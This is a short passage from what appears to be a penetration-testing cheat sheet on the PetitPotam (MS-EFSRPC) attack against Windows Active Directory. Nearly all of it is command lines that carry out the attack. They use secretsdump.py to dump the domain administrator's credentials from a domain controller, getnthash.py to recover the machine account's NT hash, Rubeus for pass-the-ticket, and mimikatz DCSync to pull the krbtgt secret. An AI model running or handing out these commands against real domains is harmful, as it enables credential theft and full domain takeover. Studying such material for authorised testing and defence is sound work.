...
### PetitPotam (MS-EFSRPC) <a href="#petitpotam-ms-efsrpc" id="petitpotam-ms-efsrpc"></a>
...
* `secretsdump.py -just-dc-user <domain>/administrator -k -no-pass "<DC-machine-acc>"@<DC-FQDN>`
* `python /opt/PKINITtools/getnthash.py -key <AS-REPencryptionkeyfromgettgtpkinit.pyoutput> <domain>/<DC-machine-acc>`  <sup><sub>(atlternate method instead of export TGT)<sub></sup>
* `secretsdump.py -just-dc-user <domain>/administrator "<DC-machine-acc>"@<DC-FQDN> -hashes <LM:NT>`
* `Rubeus.exe asktgt /user:<DC-machine-acc> /certificate:<value> /ptt`  <sup><sub>(alternate method using pass-the-ticket)<sub></sup>
* `mimikatz # lsadump::dcsync /user:<domain>\krbtgt`  <sup><sub>(DCSync attack)<sub></sup>
* **Tools**
